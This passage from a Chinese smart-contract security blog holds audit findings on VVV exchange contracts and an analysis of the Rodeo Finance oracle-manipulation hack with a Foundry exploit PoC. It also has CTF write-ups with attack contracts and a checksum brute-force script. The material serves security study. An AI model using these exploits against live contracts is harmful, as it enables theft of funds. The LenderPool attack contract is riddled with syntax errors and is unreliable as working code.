</span><br><span class="line">       _params.amountToInvest == 0</span><br><span class="line">     )&#123;</span><br><span class="line">       revert()</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></p><h1 id="三"><a href="#三" class="headerlink" title="三"></a>三</h1><h2 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h2><p>During the process where the administrator adds multiple investment records to the contract, a condition was missed, which allowed bypassing the check for matching investment addresses and amounts, leading to the creation of incorrect investment records.</p><h2 id="Root-Cause-2"><a href="#Root-Cause-2" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>The vulnerability code is as follows:</p><p>2024-11-vvv-exchange-update-HeYuan-33&#x2F;vvv-platform-smart-contracts&#x2F;contracts&#x2F;vc&#x2F;VVVVCInvestmentLedger.sol</p><p>Lines 261 to 266 in c1e47db</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( </span><br><span class="line">    _kycAddresses.length != _investmentRounds.length || </span><br><span class="line">    _investmentRounds.length != _amountsToInvest.length </span><br><span class="line">) &#123; </span><br><span class="line">    revert ArrayLengthMismatch(); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>We can see that the if condition only checks if the lengths of the investment address array and the investment round array are equal, and compares the length of the investment amount array with the investment round array. It overlooks the comparison between the lengths of the investment address array and the investment amount array. This is a careless oversight.</p><h2 id="Internal-pre-conditions-2"><a href="#Internal-pre-conditions-2" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-2"><a href="#External-pre-conditions-2" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-2"><a href="#Attack-Path-2" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact-2"><a href="#Impact-2" class="headerlink" title="Impact"></a>Impact</h2><p>Due to the uncertainty about whether the lengths of the investment address array and the investment amount array are equal, this can lead to the administrator recording incorrect investment information, causing mismatched investment amounts and rounds for users. If an attacker exploits this vulnerability, they could enter an investment round as a low-investment participant and manipulate the number of investment addresses, resulting in a mismatch between the length of the investment amount array and the address array. This could cause the administrator to record a higher investment amount, leading to irreversible losses.</p><h2 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-2"><a href="#Mitigation-2" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a validation check to ensure that the lengths of the investment address array and the investment amount array are equal, as shown below:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (</span><br><span class="line">         _kycAddresses.length != _investmentRounds.length ||</span><br><span class="line">         _investmentRounds.length != _amountsToInvest.length ||</span><br><span class="line">            _kycAddresses.length !=_amountsToInvest.length</span><br><span class="line">        ) &#123;</span><br><span class="line">            revert ArrayLengthMismatch();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h1 id="虽然都被判为无效了。但是正确的有俩个漏洞时一是msg-sender的调用，二是抢跑攻击，只对nouce的检查，会让攻击者预先知道监听。让我们来看一下正确的报告："><a href="#虽然都被判为无效了。但是正确的有俩个漏洞时一是msg-sender的调用，二是抢跑攻击，只对nouce的检查，会让攻击者预先知道监听。让我们来看一下正确的报告：" class="headerlink" title="虽然都被判为无效了。但是正确的有俩个漏洞时一是msg.sender的调用，二是抢跑攻击，只对nouce的检查，会让攻击者预先知道监听。让我们来看一下正确的报告："></a>虽然都被判为无效了。但是正确的有俩个漏洞时一是msg.sender的调用，二是抢跑攻击，只对nouce的检查，会让攻击者预先知道监听。让我们来看一下正确的报告：</h1><h2 id="Token-Claim-Hijacking-Due-to-Missing-Validation"><a href="#Token-Claim-Hijacking-Due-to-Missing-Validation" class="headerlink" title="Token Claim Hijacking Due to Missing Validation"></a>Token Claim Hijacking Due to Missing Validation</h2><h2 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h2><p>The VVVVCTokenDistributor contract is vulnerable to a frontrunning attack due to missing validation of the msg.sender during the claim process. An attacker can exploit this by observing pending valid transactions and preemptively executing them with a higher gas price, thus claiming tokens intended for other users.</p><h2 id="Root-Cause-3"><a href="#Root-Cause-3" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Lack of msg.sender Validation:</p><p>The claim function directly transfers tokens to msg.sender without checking if this address is the same as the kycAddress. This oversight allows any arbitrary address to execute the claim given access to a valid signature and calldata.</p><p><a href="https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/1791f41b310489aaa66de349ef1b9e4bd331f14b/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L106C4-L136C10">https://github.com/sherlock-audit/2024-11-vvv-exchange-update/blob/1791f41b310489aaa66de349ef1b9e4bd331f14b/vvv-platform-smart-contracts/contracts/vc/VVVVCTokenDistributor.sol#L106C4-L136C10</a></p><pre><code>function claim(ClaimParams memory _params) public &#123;      if (claimIsPaused) &#123;          revert ClaimIsPaused();      &#125;      if (_params.projectTokenProxyWallets.length != _params.tokenAmountsToClaim.length) &#123;          revert ArrayLengthMismatch();      &#125;      if (_params.nonce &lt;= nonces[_params.kycAddress]) &#123;          revert InvalidNonce();      &#125;      if (!_isSignatureValid(_params)) &#123;          revert InvalidSignature();      &#125;      // update nonce      nonces[_params.kycAddress] = _params.nonce;      // define token to transfer      IERC20 projectToken = IERC20(_params.projectTokenAddress);      // transfer tokens from each wallet to the caller      for (uint256 i = 0; i &lt; _params.projectTokenProxyWallets.length; i++) &#123;          projectToken.safeTransferFrom(              _params.projectTokenProxyWallets[i],              msg.sender,              _params.tokenAmountsToClaim[i]          );      &#125;  </code></pre><h2 id="Internal-pre-conditions-3"><a href="#Internal-pre-conditions-3" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>none</p><h2 id="External-pre-conditions-3"><a href="#External-pre-conditions-3" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>none</p><h2 id="Attack-Path-3"><a href="#Attack-Path-3" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>An attacker can exploit this vulnerability through the following steps:</p><p>Monitoring Transactions:</p><p>The attacker continuously monitors the Ethereum network for pending transactions targeting the VVVVCTokenDistributor contract, specifically those invoking the claim function.<br>Identifying Valid Claims:</p><p>The attacker identifies a pending transaction with valid ClaimParams and a correctly generated signature, submitted by a legitimate user intending to claim their tokens.<br>Replicating Transaction Data:</p><p>The attacker copies the calldata from the pending transaction. This calldata contains all necessary details, including the signature proving the claim’s validity.<br>Executing Frontrunning Attack:</p><p>The attacker creates a new transaction using the copied calldata, setting themselves as the msg.sender.<br>They submit this new transaction with a higher gas price, incentivizing miners to prioritize it over the original pending transaction.<br>Claiming Tokens:</p><p>Once mined, the attacker’s transaction executes before the original one, allowing them to receive the tokens intended for the legitimate claimant.</p><h2 id="Impact-3"><a href="#Impact-3" class="headerlink" title="Impact"></a>Impact</h2><p>The ability to front-run valid claims effectively nullifies the security guarantees provided by the cryptographic signature process, allowing attackers to exploit the system for illicit gain.</p><h2 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h2><p>Setup:</p><p>A legitimate user intends to execute a claim for tokens using the claim function, constructing valid ClaimParams with a correct signature.</p><p>Transaction Broadcast:</p><p>The user broadcasts their transaction on the Ethereum network, intending to receive tokens from specified proxy wallets into their own address.</p><p>Attacker Monitoring:</p><p>An attacker monitors pending transactions on the network, focusing on those interacting with the VVVVCTokenDistributor contract.</p><p>Data Replication:</p><p>Upon identifying the legitimate transaction, the attacker copies the calldata, including the ClaimParams and signature, retaining all necessary details.</p><p>Frontrunning Execution:</p><p>The attacker submits their own transaction using the duplicated calldata but specifies themselves as msg.sender.<br>The attacker sets a higher gas price to prioritize their transaction over the original.</p><p>Successful Claim Theft:</p><p>The attacker’s transaction gets mined before the original, claiming the tokens intended for the legitimate user.<br>The original user’s transaction fails due to the incremented nonce, rendering their claim invalid.</p><h2 id="Mitigation-3"><a href="#Mitigation-3" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Modify the claim function to include a check ensuring that msg.sender matches the kycAddress specified in the ClaimParams. This alignment verifies that the account executing the claim is the same account authorized to receive the tokens.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claim(ClaimParams memory _params) public &#123;  </span><br><span class="line">    require(msg.sender == _params.kycAddress, &quot;Sender not authorized to claim on behalf of KYC address&quot;);  </span><br><span class="line">    // ... existing claim logic ...  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2024/11/17/RodeoFinance%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/17/RodeoFinance%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>攻击介绍<br>2023年7月11日，Arbitrum链上的Rodeo Finance: Pool由于价格预言机操纵，而被黑客盗取了472 ETH。</p><p>攻击分析<br>攻击者利用了预言机的缺陷控制了unshETH与ETH之间的兑换比率,预言机使用 ETH 与 unshETH 的准备金比率来检查价格。同时攻击者能够通过具有未配置策略地址的 earn 函数强制平台将 USDC 兑换为 unshETH。由于价格预言机存在缺陷，滑点控制无法生效。(具体可见Meth为0x7b37c42b的交易)。</p><p>function earn(address usr, address pol, uint256 str, uint256 amt, uint256 bor, bytes calldata dat)<br>  external<br>  loop<br>  returns (uint256)<br>{<br>  if (status &lt; S_LIVE) revert WrongStatus();<br>  if (!pools[pol]) revert InvalidPool();<br>  if (strategies[str] &#x3D;&#x3D; address(0)) revert InvalidStrategy();<br>  uint256 id &#x3D; nextPosition++;<br>  Position storage p &#x3D; positions[id];<br>  p.owner &#x3D; usr;<br>  p.pool &#x3D; pol;<br>  p.strategy &#x3D; str;<br>  p.outset &#x3D; block.timestamp;<br>  pullTo(IERC20(IPool(p.pool).asset()), msg.sender, address(actor), uint256(amt));<br>  (int256 bas, int256 sha, int256 bar) &#x3D; actor.edit(id, int256(amt), int256(bor), dat);<br>  p.amount &#x3D; uint256(bas);<br>  p.shares &#x3D; uint256(sha);<br>  p.borrow &#x3D; uint256(bar);<br>  emit Edit(id, int256(amt), int256(bor), sha, bar);<br>  return id;<br>}<br>其次unshETH价格使用了TWAP，是计算45分钟内的最后4次更新价格实例的平均值，导致攻击者可以通过”三明治”来控制价格，从而套利。</p><p>function latestAnswer() external view returns (int256) {<br>  require(block.timestamp &lt; lastTimestamp + (updateInterval * 2), “stale price”);<br>  int256 price &#x3D; (prices[0] + prices[1] + prices[2] + prices[3]) &#x2F; 4;<br>  return price;<br>}<br>POC<br>&#x2F;&#x2F; SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.10;</p><p>import “forge-std&#x2F;Test.sol”;<br>import “.&#x2F;interface.sol”;</p><p>&#x2F;&#x2F; Vulnerable Contract : 0xf3721d8a2c051643e06bf2646762522fa66100da<br>&#x2F;&#x2F; Attack Tx : 0xb1be5dee3852c818af742f5dd44def285b497ffc5c2eda0d893af542a09fb25a</p><p>interface IInvestor {<br>    function earn(<br>        address usr,<br>        address pol,<br>        uint256 str,<br>        uint256 amt,<br>        uint256 bor,<br>        bytes memory dat<br>    ) external returns (uint256);<br>}</p><p>interface ICamelotRouter {<br>    function swapExactTokensForTokensSupportingFeeOnTransferTokens(<br>        uint256 amountIn,<br>        uint256 amountOutMin,<br>        address[] memory path,<br>        address to,<br>        address referrer,<br>        uint256 deadline<br>    ) external;<br>}</p><p>interface ISwapRouter {<br>    struct ExactInputParams {<br>        bytes path;<br>        address recipient;<br>        uint256 deadline;<br>        uint256 amountIn;<br>        uint256 amountOutMinimum;<br>    }</p><pre><code>function exactInput(ExactInputParams memory params) external payable returns (uint256 amountOut);</code></pre><p>}</p><p>contract RodeoTest is Test {<br>    IERC20 unshETH &#x3D; IERC20(0x0Ae38f7E10A43B5b2fB064B42a2f4514cbA909ef);<br>    IERC20 WETH &#x3D; IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);<br>    IERC20 USDC &#x3D; IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);<br>    IInvestor Investor &#x3D; IInvestor(0x8accf43Dd31DfCd4919cc7d65912A475BfA60369);<br>    ICamelotRouter Router &#x3D; ICamelotRouter(0xc873fEcbd354f5A56E00E710B90EF4201db2448d);<br>    ISwapRouter SwapRouter &#x3D; ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);<br>    IBalancerVault Vault &#x3D; IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);<br>    address private constant usdcPool &#x3D; 0x0032F5E1520a66C6E572e96A11fBF54aea26f9bE;<br>    CheatCodes cheats &#x3D; CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);</p><pre><code>function setUp() public &#123;    cheats.createSelectFork(&quot;arbitrum&quot;, 110_043_452);    cheats.label(address(unshETH), &quot;unsETH&quot;);    cheats.label(address(WETH), &quot;WETH&quot;);    cheats.label(address(USDC), &quot;USDC&quot;);    cheats.label(address(Investor), &quot;Investor&quot;);    cheats.label(address(Router), &quot;Router&quot;);    cheats.label(address(SwapRouter), &quot;SwapRouter&quot;);    cheats.label(address(Vault), &quot;Vault&quot;);&#125;function testExploit() public &#123;    deal(address(unshETH), address(this), 47_294_222_088_336_002_957);    unshETH.approve(address(Router), type(uint256).max);    WETH.approve(address(Router), type(uint256).max);    USDC.approve(address(SwapRouter), type(uint256).max);    Investor.earn(address(this), usdcPool, 41, 0, 400_000 * 1e6, abi.encode(500));       swapTokens(unshETH.balanceOf(address(this)), address(unshETH), address(WETH));    swapTokens(WETH.balanceOf(address(this)), address(WETH), address(USDC));    swapUSDCToWETH();    takeWETHFlashloanOnBalancer();&#125;function receiveFlashLoan(    address[] memory tokens,    uint256[] memory amounts,    uint256[] memory feeAmounts,    bytes memory userData) external &#123;        swapTokens(amounts[0], address(WETH), address(USDC));        swapUSDCToWETH();        WETH.transfer(address(Vault), amounts[0]);&#125;function swapTokens(uint256 amountIn, address fromToken, address toToken) internal &#123;    address[] memory path = new address[](2);    path[0] = fromToken;    path[1] = toToken;    Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(        amountIn, 0, path, address(this), address(0), block.timestamp + 100    );&#125;function swapUSDCToWETH() internal &#123;    bytes memory path = abi.encodePacked(address(USDC), uint24(500), address(WETH));    ISwapRouter.ExactInputParams memory params =        ISwapRouter.ExactInputParams(path, address(this), block.timestamp + 100, USDC.balanceOf(address(this)), 0);    SwapRouter.exactInput(params);&#125;function takeWETHFlashloanOnBalancer() internal &#123;    address[] memory tokens = new address[](1);    tokens[0] = address(WETH);    uint256[] memory amounts = new uint256[](1);    amounts[0] = 30e18;    Vault.flashLoan(address(this), tokens, amounts, bytes(&quot;&quot;));&#125;</code></pre><p>}</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Numen-LenderPool</title>
      <link href="/2024/11/13/CTF-Numen-LenderPool/"/>
      <url>/2024/11/13/CTF-Numen-LenderPool/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-Numen-LenderPool"><a href="#CTF-Numen-LenderPool" class="headerlink" title="CTF-Numen-LenderPool"></a>CTF-Numen-LenderPool</h1><p>题目有点长的，主要是接口使用多了<br>源代码<a href="https://github.com/minaminao/ctf-blockchain/blob/main/src/NumenCTF/LenderPool/challenge/Re.sol">点击</a></p><p>要求很明显：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">     if (token0.balanceOf(address(lenderPool)) == 0) &#123;</span><br><span class="line">         return true;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>耗尽池中所有的token0</p><p>关键就是在<code>flashLoan</code>函数中一个外部调用出现了问题：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">token0.transfer(borrower, borrowAmount);</span><br><span class="line">     borrower.functionCall(abi.encodeWithSignature(&quot;receiveEther(uint256)&quot;, borrowAmount));</span><br></pre></td></tr></table></figure><p>当发送给<code>borrower ``token0</code>时，会调用<code>borrower</code>的内部函数去接受，虽然flashLoan函数有防止重入的攻击的修饰，但是swap()函数没有防止重入攻击的修饰符，所以就可一进行一个&#x3D;跨函数的重入攻击。</p><p>所以这就是一个漏洞所在之处；</p><p>攻击思路：首先利用闪电贷借入token0;在闪电贷给攻击者转代币的时候，使用swap函数将token0转化为token1;造成假象已经进行还款了<br>最后直接再次调用swap函数，然后将token1换回token0,这样就无中生有消耗了池中的token0;</p><p>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity^ 0.8.13;</span><br><span class="line"></span><br><span class="line">interface LenderPool&#123;</span><br><span class="line">    function swap(address tokenAddress, uint256 amount) exteranl returns(uint256);</span><br><span class="line">     function flashLoan(uint256 borrowAmount,address borrower) exteranl ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">    LenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor (address _pool)&#123;</span><br><span class="line">        pool = LenderPool(_pool);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn () exteranl &#123;</span><br><span class="line">        pool.flashLoan(IERC20(pool.token0()).balanceOf(pool),address(this));</span><br><span class="line">        IERC20(address(pool.token1())).approve(address(pool));</span><br><span class="line">        pool.swap(address(pool.token0()),IERC20(pool.token(1()).balanceOf(address)));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveEther(uint256 borrowAmount) exteranl&#123;</span><br><span class="line">        IERC20(address(pool.token0())).approve(address(pool))</span><br><span class="line">        pool.swap(address(pool.token1()),borrowAmount)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附加一个测试代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;./LenderPool.sol&quot;;</span><br><span class="line">import &quot;./Hack.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;</span><br><span class="line"></span><br><span class="line">contract LenderPooltest is test&#123;</span><br><span class="line">    Check public check;</span><br><span class="line">    Hack hack;</span><br><span class="line">    address hacker = makeAddr(&quot;hacker&quot;);</span><br><span class="line"></span><br><span class="line">    function setup() public&#123;</span><br><span class="line">        check = new check(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testhack() public&#123;</span><br><span class="line">        vm.startPrank(hacker);</span><br><span class="line"></span><br><span class="line">        hack = new hack();</span><br><span class="line">        hack.pwn();</span><br><span class="line"></span><br><span class="line">        assertTrue(check.isSolved());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体来说，就是这个交换没有防止重入的修饰，我们可以随意调用这个swap函数，然后就可以进行替换，完成题目。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-OnlyPwner-REVERSE RUGPULL</title>
      <link href="/2024/11/12/CTF-OnlyPwner-REVERSE-RUGPULL/"/>
      <url>/2024/11/12/CTF-OnlyPwner-REVERSE-RUGPULL/</url>
      
        <content type="html"><![CDATA[<p>题目源码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract PrivilegeFinance &#123; </span><br><span class="line">    </span><br><span class="line">string public name = &quot;Privilege Finance&quot;;</span><br><span class="line">string public symbol = &quot;PF&quot;;</span><br><span class="line">uint256 public decimals = 18;</span><br><span class="line">uint256 public totalSupply = 200000000000;</span><br><span class="line">    mapping(address =&gt; uint) public balances;</span><br><span class="line">    mapping(address =&gt; address) public referrers;</span><br><span class="line">    string msgsender = &#x27;0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0&#x27;;</span><br><span class="line">    uint public rewmax = 65000000000000000000000;</span><br><span class="line">    uint public time = 1677729607;</span><br><span class="line">    uint public Timeinterval = 600;</span><br><span class="line">    uint public Timewithdraw = 6000;</span><br><span class="line">    uint public Timeintervallimit = block.timestamp;</span><br><span class="line">    uint public Timewithdrawlimit = block.timestamp;</span><br><span class="line">    bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;</span><br><span class="line">    bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;</span><br><span class="line">    uint8 v = 28;</span><br><span class="line">    address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;</span><br><span class="line">    uint public burnFees = 2;</span><br><span class="line">    uint public ReferrerFees = 8;</span><br><span class="line">    uint public transferRate = 10;</span><br><span class="line">    address public BurnAddr = 0x000000000000000000000000000000000000dEaD;</span><br><span class="line">bool public flag;</span><br><span class="line"></span><br><span class="line">constructor() public &#123;</span><br><span class="line">    balances[address(this)] = totalSupply;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    function Airdrop() public &#123;</span><br><span class="line">        require(balances[msg.sender] == 0 &amp;&amp; block.timestamp &gt;= Timeintervallimit,&quot;Collection time not reached&quot;);</span><br><span class="line">        balances[msg.sender] += 1000;</span><br><span class="line">        balances[address(this)] -= 1000;</span><br><span class="line">        Timeintervallimit += Timeinterval;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address token, uint256 amount, address _ReferrerAddress) public &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;amount zero!&quot;);</span><br><span class="line">        if (msg.sender != address(0) &amp;&amp; _ReferrerAddress != address(0) &amp;&amp; msg.sender != _ReferrerAddress &amp;&amp; referrers[msg.sender] == address(0)) &#123;</span><br><span class="line">            referrers[msg.sender] = _ReferrerAddress;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender] -= amount;</span><br><span class="line">        balances[address(this)] += amount;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    function withdraw(address token, uint256 amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] == 0 &amp;&amp; block.timestamp &gt;= Timewithdrawlimit,&quot;Collection time not reached&quot;);</span><br><span class="line">        require(amount &gt; 0 &amp;&amp; amount &lt;= 2000,&quot;Financial restrictions&quot;);</span><br><span class="line">        Timewithdrawlimit += Timewithdraw;</span><br><span class="line">        require(amount &gt; 0, &quot;amount zero!&quot;);</span><br><span class="line">        balances[msg.sender] += amount;</span><br><span class="line">        balances[address(this)] -= amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function DynamicRew(address _msgsender,uint _blocktimestamp,uint _ReferrerFees,uint _transferRate) public returns(address) &#123;</span><br><span class="line">        require(_blocktimestamp &lt; 1677729610, &quot;Time mismatch&quot;);</span><br><span class="line">        require(_transferRate &lt;= 50 &amp;&amp; _transferRate &lt;= 50);</span><br><span class="line">        bytes32 _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp));</span><br><span class="line">        address a = ecrecover(_hash, v, r, s);</span><br><span class="line">        require(a == admin &amp;&amp; time &lt; _blocktimestamp, &quot;time or banker&quot;);</span><br><span class="line">        ReferrerFees = _ReferrerFees;</span><br><span class="line">        transferRate = _transferRate;</span><br><span class="line">        return a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address recipient,uint256 amount) public &#123;</span><br><span class="line">        if(msg.sender == admin)&#123;</span><br><span class="line">            uint256 _fee = amount * transferRate / 100;</span><br><span class="line">            _transfer(msg.sender, referrers[msg.sender], _fee * ReferrerFees / transferRate);</span><br><span class="line">            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);</span><br><span class="line">            _transfer(address(this), recipient, amount * amount * transferRate);</span><br><span class="line">            amount = amount - _fee;</span><br><span class="line"></span><br><span class="line">        &#125;else if(recipient == admin)&#123;</span><br><span class="line">            uint256 _fee = amount * transferRate / 100;</span><br><span class="line">            _transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);</span><br><span class="line">            _transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);</span><br><span class="line">            amount = amount - _fee;</span><br><span class="line">        &#125;</span><br><span class="line">        _transfer(msg.sender, recipient, amount);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">function _transfer(address from, address _to, uint _value) internal returns (bool) &#123;</span><br><span class="line">    balances[from] -= _value;</span><br><span class="line">    balances[_to] += _value;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function setflag() public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt; 10000000)&#123;</span><br><span class="line">flag = true;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function isSolved() public view returns(bool)&#123;</span><br><span class="line">    return flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求也很简单；<code>balances[msg.sender] &gt; 10000000</code>;<br>首先看向这个的合约的时候，好像没有地方可以自由的转账的，<br>看了题解，是真的牛逼<br>原来一个地址错误了<code>string msgsender = &#39;0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0&#39;;</code>这个的地址是19字节的，不满足我们20字节的地址，所以这就是突破口，因为还差一个字节，二进制8位，实际就是从Ox00到Oxff只有256种可能,就可以直接暴力破解，用p语言来破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from web3 import Web3</span><br><span class="line"></span><br><span class="line">msgsender = &quot;0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0&quot;</span><br><span class="line"></span><br><span class="line">for i in range(256):</span><br><span class="line">hexDigits = &quot;&#123;:02x&#125;&quot;.format(i)</span><br><span class="line">checksummed = Web3.toChecksumAddress(msgsender + hexDigits)</span><br><span class="line">if (checksummed[:-2] == msgsender):</span><br><span class="line">print(checksummed)</span><br><span class="line"></span><br><span class="line"># python3 bruteForceChecksum.py </span><br><span class="line">0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053</span><br></pre></td></tr></table></figure><blockquote><p>我现在还没有学过p语言，所以这个代码就是网上的破解方法，另外说一下，不能用solidity破解，是因为会消耗大量的gas,也是根本行不通的</p></blockquote><p>找到正确的地址后，就直接可以调用<code>DynamicRew</code>函数,来修改 _ReferrerFees推荐人的费用，就是我们使用推荐人的余额来到达题目要求</p><p>这是测试合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line"></span><br><span class="line">pragma solidity 0.8.12;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../src/GOATFinance.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract goatFinanceTest is Test &#123;</span><br><span class="line">    PrivilegeFinance public goatFi;</span><br><span class="line">    address owner = makeAddr(&quot;owner&quot;);</span><br><span class="line">    address hacker = makeAddr(&quot;hacker&quot;);</span><br><span class="line">    address hacker2 = makeAddr(&quot;hacker2&quot;);</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.prank(owner);</span><br><span class="line">        goatFi = new PrivilegeFinance();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testAttack() public &#123;</span><br><span class="line">        vm.startPrank(hacker);</span><br><span class="line">        </span><br><span class="line">        // get 1000 token to hacker from airdrop</span><br><span class="line">        goatFi.Airdrop();</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Hacker balance :&quot;, goatFi.balances(hacker));</span><br><span class="line">        console.log(&quot;Hacker2 balance :&quot;, goatFi.balances(hacker2));</span><br><span class="line">        console.log(&quot;GOATFinance balance :&quot;, goatFi.balances(address(goatFi)));</span><br><span class="line">        </span><br><span class="line">        // set hacker&#x27;s referrer to hacker2</span><br><span class="line">        goatFi.deposit(address(0), 1, hacker2);</span><br><span class="line">        goatFi.DynamicRew(0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E053, 1677729609, 1000000000, 50);</span><br><span class="line">        // transfer to admin, so referrer get fee from goatFi contract</span><br><span class="line">        goatFi.transfer(0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b, 999);</span><br><span class="line">        </span><br><span class="line">        console.log(&quot;Hacker balance after :&quot;, goatFi.balances(hacker));</span><br><span class="line">        console.log(&quot;Hacker2 balance after :&quot;, goatFi.balances(hacker2));</span><br><span class="line">        console.log(&quot;GOATFinance balance after :&quot;, goatFi.balances(address(goatFi)));</span><br><span class="line">        </span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        vm.startPrank(hacker2);</span><br><span class="line">        </span><br><span class="line">        goatFi.setflag();</span><br><span class="line">        </span><br><span class="line">        assertTrue(goatFi.isSolved());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后它的输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># forge test --match-path test/GOATFinance.t.sol -vv</span><br><span class="line">[⠆] Compiling...</span><br><span class="line">No files changed, compilation skipped</span><br><span class="line"></span><br><span class="line">Running 1 test for test/GOATFinance.t.sol:goatFinanceTest</span><br><span class="line">[PASS] testAttack() (gas: 191636)</span><br><span class="line">Logs:</span><br><span class="line">  Hacker balance : 